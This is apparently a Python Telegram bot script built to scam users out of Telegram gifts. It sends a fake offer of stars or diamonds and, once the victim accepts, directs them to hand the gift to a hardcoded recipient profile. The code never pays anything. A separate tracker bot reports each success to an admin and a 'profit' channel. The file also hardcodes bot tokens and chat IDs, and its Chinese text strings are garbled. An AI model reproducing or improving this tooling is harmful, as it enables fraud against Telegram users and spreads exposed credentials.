import asyncio
import logging
import uuid
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    LinkPreviewOptions,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from aiogram.exceptions import TelegramRetryAfter

# =====================================
# НАСТРОЙКИ ОФФЕР-БОТА
# =====================================
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_USERNAME = "rattiixx"
CURRENCY = {
    "g": "💎",
    "s": "⭐"
}

# =====================================
# НАСТРОЙКИ ТРЕКЕР-БОТА
# =====================================
TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731
PROFIT_CHANNEL_ID = -1003914079695
PROFIT_TOPIC_ID = 3

# =====================================
# ЛОКАЛИЗАЦИЯ
# =====================================
TEXTS = {
    "ru": {
        "offer_text": "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>.",
        "accepted": "🎁 <b>Подарок:</b> {name}\n\n<b>Предложение принято!</b>\n\nОжидается передача подарка.\n\nСумма предложения: {sum} {cur}",
        "btn_give": "🎁 Передать подарок",
        "btn_how": "❓ Как передать?",
        "btn_decline": "❌ Отклонить",
        "btn_accept": "✅ Принять",
        "alert_how": "Нажмите на кнопку ниже, чтобы перейти в профиль получателя.\n\nЗатем выберите «Подарить подарок» -> «Мои» и передайте необходимый подарок.",
        "declined": "Вы отклонили предложение."
    },
    "en": {
        "offer_text": "User <b>{who}</b> offers You {sum} {cur} for the gift <b>{name}</b>.",
        "accepted": "🎁 <b>Gift:</b> {name}\n\n<b>Offer accepted!</b>\n\nWaiting for gift transfer.\n\nOffer amount: {sum} {cur}",
        "btn_give": "🎁 Give gift",
        "btn_how": "❓ How to give?",
        "btn_decline": "❌ Decline",
        "btn_accept": "✅ Accept",
        "alert_how": "Click the button below to go to the recipient's profile.\n\nThen select 'Give gift' -> 'My' and transfer the required gift.",
        "declined": "You have declined the offer."
    },
    "cn": {
        "offer_text": " <b>{who}</b>  {sum} {cur}  <b>{name}</b>。",
        "accepted": "🎁 <b>：</b> {name}\n\n<b>！</b>\n\n。\n\n：{sum} {cur}",
        "btn_give": "🎁 ",
        "btn_how": "❓ ？",
        "btn_decline": "❌ ",
        "btn_accept": "✅ ",
        "alert_how": "。\n\n“” -> “” 。",
        "declined": "。"
    }
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}

NO_PREVIEW = LinkPreviewOptions(is_disabled=True)

# Трекер-бот инициализируется, только если токен вписан
tracker_bot: Bot | None = None
if TRACKER_BOT_TOKEN and not TRACKER_BOT_TOKEN.startswith("ВСТАВЬ"):
    tracker_bot = Bot(token=TRACKER_BOT_TOKEN)

# =====================================
# КНОПКИ
# =====================================
def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
                InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
            ]
        ]
    )

def instruction_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    profile_url = f"https://t.me/{TARGET_USERNAME}"   # Вариант 1: ссылка на профиль получателя
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_give"], url=profile_url)],
            [InlineKeyboardButton(text=t["btn_how"], callback_data=f"alert_2:{lang}")]
        ]
    )

# =====================================
# ТРЕКЕР: уведомление о принятии
# =====================================
async def notify_tracker(text: str):
    if not tracker_bot:
        return
    try:
        await tracker_bot.send_message(TRACKER_ADMIN_ID, text)
        await tracker_bot.send_message(
            PROFIT_CHANNEL_ID,
            text,
            message_thread_id=PROFIT_TOPIC_ID
        )
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after)
        await notify_tracker(text)
    except Exception:
        logging.exception("Не удалось отправить уведомление в трекер")

# =====================================
# КОМАНДА /OFFER
# =====================================
@dp.business_message(Command("offer"))
async def cmd_offer_business(message: Message):
    # Разбиваем строку по пробелам. Кавычки не нужны.
    # Формат: /offer <сумма> <g|s> <название подарка>
    args = (message.text or "").split()
    if len(args) < 4 or args[2] not in CURRENCY:
        await message.reply(
            "Формат: <code>/offer 100 s Название подарка</code>",
            link_preview_options=NO_PREVIEW
        )
        return

    sum_ = args[1]
    cur = CURRENCY[args[2]]
    name = " ".join(args[3:])

    lang = (message.from_user.language_code or "ru")[:2]
    if lang not in TEXTS:
        lang = "ru"

    oid = uuid.uuid4().hex[:8]
    OFFERS[oid] = {
        "sum": sum_,
        "cur": cur,
        "name": name,
        "lang": lang,
        "buyer_username": message.from_user.username or message.from_user.full_name,
    }

    t = TEXTS[lang]
    await bot.send_message(
        chat_id=message.chat.id,
        business_connection_id=message.business_connection_id,
        reply_to_message_id=message.message_id,
        text=t["offer_text"].format(
            who=message.from_user.username or message.from_user.full_name,
            sum=sum_,
            cur=cur,
            name=name
        ),
        reply_markup=offer_kb(oid, lang),
        link_preview_options=NO_PREVIEW
    )

# =====================================
# ПРИНЯТЬ
# =====================================
@dp.callback_query(F.data.startswith("acc:"))
async def cb_accept(call: CallbackQuery):
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer:
        await call.answer("Предложение не найдено.", show_alert=True)
        return

    t = TEXTS.get(offer["lang"], TEXTS["ru"])
    bc = call.message.business_connection_id if call.message else None
    try:
        await call.message.edit_text(
            t["accepted"].format(name=offer["name"], sum=offer["sum"], cur=offer["cur"]),
            reply_markup=instruction_kb(offer["lang"]),
            business_connection_id=bc,
            link_preview_options=NO_PREVIEW
        )
    except Exception:
        await bot.send_message(
            chat_id=call.message.chat.id,
            business_connection_id=bc,
            text=t["accepted"].format(name=offer["name"], sum=offer["sum"], cur=offer["cur"]),
            reply_markup=instruction_kb(offer["lang"]),
            link_preview_options=NO_PREVIEW
        )
